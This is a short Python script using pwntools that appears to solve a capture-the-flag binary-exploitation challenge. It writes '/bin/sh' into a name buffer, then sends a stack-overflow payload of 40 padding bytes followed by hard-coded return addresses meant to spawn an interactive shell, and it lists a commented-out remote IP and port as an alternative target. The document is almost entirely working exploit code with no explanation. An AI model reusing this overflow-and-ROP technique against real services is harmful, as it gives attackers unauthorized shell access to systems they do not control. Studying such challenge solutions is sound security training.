from pwn import*

sh = process('./pwn')
#sh = remote('202.198.27.90',28102)
elf = ELF('./pwn')

sh.sendlineafter(b'Please input your name:',b'/bin/sh\x00')

pop_rdi = 0x0000000000401313
ret = 0x000000000040101a
bin_sh = 0x4040A0

payload = b'a' * 40
payload += p64(0x401293)       #rbp
payload += p64(0x4040a0)
payload += p64(0x40101a)
payload += p64(0x4010b0)

gdb.attach(sh)
pause()
sh.sendlineafter(b'safe?',payload)
sh.interactive()
